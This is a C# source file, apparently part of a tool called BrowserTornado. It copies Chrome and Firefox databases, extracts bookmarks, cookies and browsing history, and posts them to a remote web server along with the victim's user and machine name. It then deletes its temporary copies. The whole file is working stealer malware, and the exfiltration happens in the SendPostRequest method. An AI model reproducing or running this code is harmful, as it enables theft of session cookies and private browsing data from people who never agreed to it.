using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using Newtonsoft.Json;

namespace BrowserTornado
{
    public class BrowserTornadoManager
    {
        HttpClient httpClient = new HttpClient();

        string webServer;

        enum Browser { Chrome, Firefox }


        /// <summary>
        /// Constructor calling the main methods for processing, then clearing up the temp files
        /// </summary>
        public BrowserTornadoManager(string webServer)
        {
            if (!Directory.Exists("TempFiles"))
            {
                Directory.CreateDirectory("TempFiles");
            }

            this.webServer = webServer;
        }



        public void Process()
        {
            ProcessChrome();
            ProcessFirefox();

            ClearTempFiles();
        }



        /// <summary>
        /// Copy chrome databases and for all databases,
        /// dump its content and send a POST request of it
        /// </summary>
        void ProcessChrome()
        {
            if (CopyUtility.CopyChromeDatabases())
            {
                var bookmarks = Chrome.DumpBookmarks(@"TempFiles\chrome-bookmarks").ToList();                
                var cookies = Chrome.DumpCookies(@"TempFiles\chrome-cookies").ToList();                
                var history = Chrome.DumpHistory(@"TempFiles\chrome-history").ToList();

                SendPostRequest(bookmarks, cookies, history, Browser.Chrome);
            }
        }


        /// <summary>
        /// Copy firefox databases and for all databases,
        /// dump its content and send a POST request of it
        /// </summary>
        void ProcessFirefox()
        {
            if (CopyUtility.CopyFirefoxDatabases())
            {
                var bookmarks = Firefox.DumpBookmarks(@"TempFiles\ff-places").ToList();
                var cookies = Firefox.DumpCookies(@"TempFiles\ff-cookies").ToList();
                var history = Firefox.DumpHistory(@"TempFiles\ff-places").ToList();

                SendPostRequest(bookmarks, cookies, history, Browser.Firefox);
            }
        }


        /// <summary>
        /// Send a POST request to the server containing the dumped data and the browser dumped (chrome or firefox)
        /// </summary>
        /// <param name="bookmarks">List of Tuple(string, string) containing the browser's bookmarks</param>
        /// <param name="cookies">List of CookieObject</param>
        /// <param name="history">List of string representing the history</param>
        /// <param name="browser">Firefox or Chrome</param>
        void SendPostRequest(List<Tuple<string, string>> bookmarks, List<CookieObject> cookies, List<string> history, Browser browser)
        {
            var jsonBookmarks = JsonConvert.SerializeObject(bookmarks);
            var jsonCookies = JsonConvert.SerializeObject(cookies);
            var jsonHistory = JsonConvert.SerializeObject(history);

            var values = new Dictionary<string, string>
            {
                { "User", Environment.UserName + '@' + Environment.MachineName },
                { "Browser", browser.ToString() },
                { "Bookmarks", jsonBookmarks },
                { "Cookies", jsonCookies },
                { "History", jsonHistory }
            };

            var content = new FormUrlEncodedContent(values);

            var dummy = httpClient.PostAsync(webServer, content).Result;
        }


        /// <summary>
        /// Delete the local "TempFiles" folderand its content
        /// </summary>
        void ClearTempFiles()
        {
            try
            {
                Directory.Delete("TempFiles", true);
            }
            catch (Exception)
            {
                // ignored
            }
        }
    }
}
